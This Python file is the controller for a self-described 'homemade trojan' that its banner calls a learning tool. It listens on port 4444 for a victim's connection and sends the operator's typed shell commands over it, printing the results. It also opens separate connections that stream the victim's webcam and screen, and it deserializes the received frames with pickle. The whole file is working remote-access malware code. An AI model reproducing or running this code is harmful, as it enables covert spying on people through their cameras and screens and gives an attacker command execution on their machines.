import socket
import cv2
import socket
import struct
import pickle
import threading

import numpy as np


def receive_image(sock):
    # 接收数据大小
    data_size = struct.unpack("L", sock.recv(struct.calcsize("L")))[0]
    # 接收数据
    data = b''
    while len(data) < data_size:
        packet = sock.recv(data_size - len(data))
        if not packet:
            break
        data += packet

    if not data:
        return None

    # 反序列化图像数据
    image = pickle.loads(data)
    # 转换为 OpenCV 格式
    frame = np.array(image)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    return frame

def screen_capture(ip):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (ip, 8486)  # 替换为服务器的实际 IP 地址
    client_socket.connect(server_address)

    try:
        while True:
            # 接收并显示图像
            frame = receive_image(client_socket)
            if frame is not None:
                # 设置缩放比例
                scale_percent = 50  # 例如，50% 的缩放比例
                width = int(frame.shape[1] * scale_percent / 100)
                height = int(frame.shape[0] * scale_percent / 100)
                dim = (width, height)
                # 缩放图像
                resized_frame = cv2.resize(frame, dim, interpolation=cv2.INTER_AREA)
                # 使用更高效的编码格式（如 JPEG）
                _, compressed_frame = cv2.imencode('.jpeg', resized_frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
                # 解码图像
                decompressed_frame = cv2.imdecode(compressed_frame, cv2.IMREAD_COLOR)
                # 显示图像
                cv2.imshow("Remote Desktop", decompressed_frame)

            # 按下 ESC 键退出
            if cv2.waitKey(10) == 27:
                break

    except KeyboardInterrupt:
        print("Program interrupted by user")

    # 释放资源
    client_socket.close()
    cv2.destroyAllWindows()
def start_server(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip,port))
    s.listen(5)
    print(f'[*] Listening on {ip}:{port}')
    return s
def open_video(ip):
#创建一个 socket 对象
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (ip,8485)  # 替换为服务器的实际 IP 地址
    client_socket.connect(server_address)

    try:
        while True:
            # 接收数据大小
            data_size = struct.unpack("L", client_socket.recv(struct.calcsize("L")))[0]
            # 接收图像数据
            data = b''
            while len(data) < data_size:
                packet = client_socket.recv(data_size - len(data))
                if not packet:
                    break
                data += packet

            if not data:
                break

            # 反序列化图像数据
            frame = pickle.loads(data)
            # 显示图像
            cv2.imshow("camera", frame)

            # 按下 ESC 键退出
            if cv2.waitKey(10) == 27:
                break

    except KeyboardInterrupt:
        print("Program interrupted by user")

    # 释放资源
    client_socket.close()
    cv2.destroyAllWindows()


def handle_client(client_socket):
    while True:
        command = input('> ')
        client_socket.send(command.encode())
        if command=='video':
            ip=input('对方ip:')
            video_thread = threading.Thread(target=open_video,args=(ip,))
            video_thread.start()
            continue
        if command=='screen':
            ip=input('对方ip:')
            screen_thread = threading.Thread(target=screen_capture,args=(ip,))
            screen_thread.start()
            continue
        if command.lower() == 'exit':
            break
        result = client_socket.recv(4096).decode('gbk')
        print(result)
if __name__ == '__main__':
    print('''==============================================================================
           自制木马学习小工具                  by Licharse
=============================================================================''')
    print('1.输入video打开摄像头')
    print('2.输入screen打开屏幕监控')
    ip = '192.168.20.104'  # 控制服务器的IP地址
    port = 4444        # 控制服务器的端口
    server = start_server(ip,port)
    client_socket, addr = server.accept()
    print(f'[*] Connection from {addr}')
    handle_client(client_socket)
